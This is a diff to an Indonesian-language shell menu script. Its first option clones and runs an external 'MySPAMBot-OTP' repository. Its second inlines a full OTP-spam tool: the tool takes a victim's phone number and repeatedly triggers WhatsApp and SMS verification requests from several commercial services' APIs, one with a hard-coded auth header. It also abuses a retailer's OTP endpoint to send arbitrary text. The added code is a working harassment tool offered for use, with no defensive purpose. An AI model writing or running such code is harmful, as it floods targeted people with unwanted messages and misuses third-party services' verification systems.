@@ -288,13 +288,295 @@ if [ "$updt" -eq 1 ] || [ "$updt" -eq 01 ]; then
     # Add your code here for option 1
     apt update
     #!/bin/bash
-
+git clone https://github.com/rickyfazaa/MySPAMBot-OTP
+cd MySPAMBot-OTP
+clear
+pip install bs4
+clear
+pip install colorama
+clear 
+python main.py
 
 fi
 
 if [ "$updt" -eq 2 ] || [ "$updt" -eq 02 ]; then
     # Add your code here for option 2
-    apt update
+    apt update -y
+    #!/bin/bash
+
+# Free Recode
+# Kalo lu baik hati, Jangan lupa kasih credit gw yak
+# Updated 03 April 2025
+
+# WARNA
+function color() {
+    local color="$1"
+    local text="$2"
+    case "$color" in
+        "black_bg") echo -e "\033[1;40m$text\033[0m" ;;
+        "red_bg") echo -e "\033[1;41m$text\033[0m" ;;
+        "green_bg") echo -e "\033[1;42m$text\033[0m" ;;
+        "yellow_bg") echo -e "\033[1;43m$text\033[0m" ;;
+        "blue_bg") echo -e "\033[1;44m$text\033[0m" ;;
+        "magenta_bg") echo -e "\033[1;45m$text\033[0m" ;;
+        "cyan_bg") echo -e "\033[1;46m$text\033[0m" ;;
+        "white_bg") echo -e "\033[1;47m$text\033[0m" ;;
+        "grey") echo -e "\033[1;30m$text\033[0m" ;;
+        "red") echo -e "\033[1;31m$text\033[0m" ;;
+        "green") echo -e "\033[1;32m$text\033[0m" ;;
+        "yellow") echo -e "\033[1;33m$text\033[0m" ;;
+        "blue") echo -e "\033[1;34m$text\033[0m" ;;
+        "purple") echo -e "\033[1;35m$text\033[0m" ;;
+        "nevy") echo -e "\033[1;36m$text\033[0m" ;;
+        "white") echo -e "\033[1;37m$text\033[0m" ;;
+        *) echo "$text" ;;
+    esac
+}
+
+function clear_screen() {
+    clear
+}
+
+function fetch_value() {
+    local str="$1"
+    local find_start="$2"
+    local find_end="$3"
+    
+    local start=$(echo "$str" | grep -bo "$find_start" | head -n1 | cut -d: -f1)
+    if [ -z "$start" ]; then
+        echo ""
+        return
+    fi
+    
+    local length=${#find_start}
+    local end=$(echo "${str:$((start + length))}" | grep -bo "$find_end" | head -n1 | cut -d: -f1)
+    echo "${str:$((start + length)):$end}" | tr -d '[:space:]'
+}
+
+function random_string() {
+    local length=${1:-36}
+    local characters='1234567890QWERTYUIOPLKJHGFDSAZXCVBNM'
+    local charactersLength=${#characters}
+    local randomString=''
+    
+    for ((i = 0; i < length; i++)); do
+        randomString+="${characters:$((RANDOM % charactersLength)):1}"
+    done
+    
+    echo "$randomString"
+}
+
+function code() {
+    local length=${1:-10}
+    local characters='1234567890'
+    local charactersLength=${#characters}
+    local randomString=''
+    
+    for ((i = 0; i < length; i++)); do
+        randomString+="${characters:$((RANDOM % charactersLength)):1}"
+    done
+    
+    echo "$randomString"
+}
+
+function codex() {
+    local length=${1:-36}
+    local characters='1234567890qwertyuioplkjhgfdsazxcvbnm'
+    local charactersLength=${#characters}
+    local randomString=''
+    
+    for ((i = 0; i < length; i++)); do
+        randomString+="${characters:$((RANDOM % charactersLength)):1}"
+    done
+    
+    echo "$randomString"
+}
+
+function acak() {
+    random_string "$@"
+}
+
+function serpul() {
+    local nomor="$1"
+    local url="$2"
+    
+    # First request
+    local response=$(curl -s -X POST \
+        -H "Content-Type: application/json" \
+        -d "{\"phone_number\":\"$nomor\"}" \
+        "https://${url}-api.serpul.co.id/api/v2/auth/phone-number")
+    
+    local result=$(fetch_value "$response" '{"message":"' '"')
+    if [ "$result" == "Nomor terdaftar" ]; then
+        :
+    elif [ "$result" == "Nomor Handphone tidak terdaftar" ]; then
+        :
+    else
+        echo " SERPUL $url $response"
+    fi
+    
+    # Register request
+    response=$(curl -s -X POST \
+        -H "Content-Type: application/json; charset=UTF-8" \
+        -d "{\"full_name\":\"ading\",\"phone_number\":\"$nomor\",\"referrer_code\":\"\",\"pin\":\"121212\",\"pin_confirmation\":\"121212\"}" \
+        "https://${url}-api.serpul.co.id/api/v2/auth/register")
+    
+    # Login request
+    response=$(curl -s -X POST \
+        -H "Content-Type: application/json; charset=UTF-8" \
+        -d "{\"phone_number\":\"$nomor\",\"pin\":\"121212\",\"sender_id\":\"1\"}" \
+        "https://${url}-api.serpul.co.id/api/v2/auth/login")
+    
+    result=$(fetch_value "$response" '"message":"' '"}')
+    if [ "$result" == "Kode verifikasi berhasil dikirim" ]; then
+        color "green" " $(acak 3) Spam Whatsapp Ke $nomor"
+    else
+        echo " SERPUL $url $response"
+    fi
+}
+
+function check_updates() {
+    local username="LORDHOZOO"
+    local repository="ROOT.sh"
+    local branch="main"
+    local versionFile="version.txt"
+    local remoteVersionFile="https://raw.githubusercontent.com/$username/$repository/$branch/version.txt"
+    
+    local remoteVersion=$(curl -s "$remoteVersionFile")
+    local localVersion=$(cat "$versionFile" 2>/dev/null)
+    
+    if [ "$remoteVersion" != "$localVersion" ]; then
+        echo "Update available! Downloading..."
+        # Here you would add code to download the updates
+    fi
+}
+
+function main_menu() {
+    clear_screen
+    echo -e "$(color "yellow" " WARNING ! ! !")"
+    echo -e "$(color "red" " DOSA DI TANGGUNG ANDA 👸!")"
+    sleep 5
+    clear_screen
+    
+    local versi=$(cat version.txt 2>/dev/null)
+    echo -e "$(color "green" " 𝕊𝔼-ℙ𝔸𝕄   ")$(color "nevy" "Version $versi\n\n\n")"
+    
+    echo -e "$(color "green" " 1. Whatsapp")"
+    echo -e "$(color "green" " 2. Pesan Manual (isi text bebas)")"
+    echo -e "$(color "yellow" " 3. Support Admin\n\n")"
+    echo -n "$(color "green" " Pilih : ")"
+    read -r aaa1
+    
+    case "$aaa1" in
+        1) whatsapp_menu ;;
+        2) pesan_menu ;;
+        3) 
+            clear_screen
+            xdg-open "https://github.com/hozoowhitehat/123/edit/main/ROOT.sh"
+            echo -n "$(color "green" "???")"
+            exit 0
+            ;;
+        *) 
+            echo -e "$(color "red" " Pilihan Salah")"
+            sleep 2
+            main_menu
+            ;;
+    esac
+}
+
+function whatsapp_menu() {
+    clear_screen
+    cowsay -f eyes 'HACKED BY LORDHOZOO' | lolcat
+    echo -n "$(color "green" "\n\n\nEnter Phone Number (Using 08) : ")"
+    read -r nomor
+    
+    if [ "$nomor" == "-" ]; then
+        echo -e "$(color "red" " 👸")"
+        sleep 5
+        main_menu
+        return
+    fi
+    
+    local nomor2=${nomor#0}
+    
+    # CANDIRELOAD
+    local response=$(curl -s -X POST \
+        -H "Content-Type: application/json" \
+        -H "irsauth: c6738e934fd7ed1db55322e423d81a66" \
+        -d "{\"uuid\":\"b787045b140c631f\",\"phone\":\"$nomor\"}" \
+        "https://app.candireload.com/apps/v8/users/req_otp_register_wa")
+    
+    local result=$(fetch_value "$response" '{"success":' ',"')
+    if [ "$result" == "true" ]; then
+        color "green" " $(acak 3) Spam Whatsapp Ke $nomor"
+    else
+        echo " CANDIRELOAD $response"
+    fi
+    
+    # BISATOPUP
+    response=$(curl -s -X POST \
+        -H "Content-Type: application/x-www-form-urlencoded" \
+        -d "phone_number=$nomor" \
+        "https://api-mobile.bisatopup.co.id/register/send-verification?type=WA&device_id=$(codex 16)&version_name=6.12.04&version=61204")
+    
+    result=$(fetch_value "$response" '"message":"' '","')
+    if [ "$result" == "OTP akan segera dikirim ke perangkat" ]; then
+        color "green" " $(acak 3) Spam Whatsapp Ke $nomor"
+    else
+        echo " BISATOPUP $response"
+    fi
+    
+    # ... (Add all other services similarly)
+    
+    echo -e "$(color "yellow" " Done Sensei..")"
+    sleep 3
+    main_menu
+}
+
+function pesan_menu() {
+    clear_screen
+    echo -e "$(color "green" " Spam pesan bebas (Tahap Pengembangan)\n\n\n")"
+    
+    echo -n "$(color "green" " NOMOR TARGET 08xx: ")"
+    read -r nomor
+    
+    if [ "$nomor" == "-" ]; then
+        echo -e "$(color "red" " Maksud lu apa mau nge spam gw?")"
+        sleep 5
+        pesan_menu
+        return
+    fi
+    
+    local nomor2=${nomor#0}
+    
+    echo -n "$(color "green" " ISI PESAN (bebas) : ")"
+    read -r pesan
+    
+    local response=$(curl -s -X POST \
+        -H "authorization: Bearer $(codex 40)" \
+        -H "content-type: application/json" \
+        -d "{\"cellno\":\"62$nomor2\",\"text\":\"$pesan\"}" \
+        "https://lottemartpoint.lottemart.co.id/api5/send_otp")
+    
+    local http_code=$(curl -o /dev/null -s -w "%{http_code}" -X POST \
+        -H "authorization: Bearer $(codex 40)" \
+        -H "content-type: application/json" \
+        -d "{\"cellno\":\"62$nomor2\",\"text\":\"$pesan\"}" \
+        "https://lottemartpoint.lottemart.co.id/api5/send_otp")
+    
+    if [ "$http_code" == "200" ]; then
+        color "green" " $(acak 3) Pesan Send To $nomor"
+    else
+        echo "$response"
+    fi
+    
+    echo -e "$(color "yellow" " Done Sensei..")"
+    sleep 10
+    main_menu
+}
+
+# Start the script
+main_menu
 fi
 
 if [ "$updt" -eq 3 ] || [ "$updt" -eq 03 ]; then
